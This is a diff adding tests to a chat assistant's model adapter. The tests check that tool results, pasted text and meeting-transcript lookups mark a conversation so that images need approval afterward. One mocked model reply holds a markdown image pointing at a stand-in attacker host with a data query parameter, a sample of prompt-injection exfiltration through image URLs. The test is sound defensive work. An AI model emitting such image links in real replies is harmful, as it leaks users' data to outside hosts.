@@ -13,6 +13,7 @@ import {
   type AdapterDeps,
 } from "./chatModelAdapter";
 import { createMeetingMessageRegistry, takePendingCompletion, takePendingReceipt } from "./pendingHandoff";
+import { isConversationMarked, notePastedText, resetImageGateForTests } from "../lib/imageGate";
 import { getToolActivity } from "../lib/toolActivityStore";
 import type { CompactionCheckpoint } from "./compaction";
 import type { MeetingCandidate, MeetingRetrievalOutcome } from "../lib/meetingChat/types";
@@ -608,5 +609,65 @@ describe("turn admission without private access", () => {
     const result = await drain(createChatModelAdapter(deps).run({ messages: oneUserMessage(), abortSignal: new AbortController().signal } as never) as never);
     expect(result.thrown).toBeDefined();
     expect(result.text).toBe("");
+  });
+});
+
+describe("chatModelAdapter marks the chat when outside content enters (images ask first from then on)", () => {
+  afterEach(() => { globalThis.fetch = realFetch; });
+
+  async function runTurn(deps: AdapterDeps, onText: () => void = () => {}) {
+    for await (const update of createChatModelAdapter(deps).run({
+      messages: oneUserMessage(), context: {}, abortSignal: new AbortController().signal,
+      unstable_assistantMessageId: "gate-assistant",
+    } as never) as AsyncIterable<{ content?: { type: string }[] }>) {
+      if (update.content?.some((part) => part.type === "text")) onText();
+    }
+  }
+
+  test("a tool result marks the chat before the reply that follows it yields any text", async () => {
+    resetImageGateForTests();
+    globalThis.fetch = (async () => new Response(
+      'data: {"tool_activity":{"name":"web_search","status":"running"}}\n\n' +
+      'data: {"id":"c1","choices":[{"delta":{"content":"Here: ![x](https://evil.example/x?d=1)"}}]}\n\n' +
+      "data: [DONE]\n\n",
+      { status: 200, headers: { "content-type": "text/event-stream" } },
+    )) as typeof fetch;
+    const { deps } = makeDeps({ agentEnabledRef: ref(true), contextTokensFor: () => 64_000 });
+    expect(isConversationMarked("t1")).toBe(false);
+    const markedAtFirstText: boolean[] = [];
+    await runTurn(deps, () => markedAtFirstText.push(isConversationMarked("t1")));
+    expect(markedAtFirstText.length).toBeGreaterThan(0);
+    expect(markedAtFirstText.every(Boolean)).toBe(true);
+  });
+
+  test("a turn that used no tool and had no pasted text leaves the chat unmarked", async () => {
+    resetImageGateForTests();
+    globalThis.fetch = (async () => okStreamResponse("Plain answer.")) as typeof fetch;
+    const { deps } = makeDeps({ agentEnabledRef: ref(false), contextTokensFor: () => 64_000 });
+    await runTurn(deps);
+    expect(isConversationMarked("t1")).toBe(false);
+  });
+
+  test("text pasted into the composer marks the next turn before it streams", async () => {
+    resetImageGateForTests();
+    globalThis.fetch = (async () => okStreamResponse("Plain answer.")) as typeof fetch;
+    const { deps } = makeDeps({ agentEnabledRef: ref(false), contextTokensFor: () => 64_000 });
+    notePastedText();
+    const markedAtFirstText: boolean[] = [];
+    await runTurn(deps, () => markedAtFirstText.push(isConversationMarked("t1")));
+    expect(markedAtFirstText.every(Boolean)).toBe(true);
+    expect(markedAtFirstText.length).toBeGreaterThan(0);
+  });
+
+  test("a meeting transcript lookup marks the chat, whatever it finds", async () => {
+    resetImageGateForTests();
+    globalThis.fetch = (async () => okStreamResponse("Plain answer.")) as typeof fetch;
+    const { deps } = makeDeps({
+      agentEnabledRef: ref(false),
+      contextTokensFor: () => 64_000,
+      meetingRetriever: { retrieve: async () => ({ status: "no-match" }) as never },
+    });
+    await runTurn(deps);
+    expect(isConversationMarked("t1")).toBe(true);
   });
 });
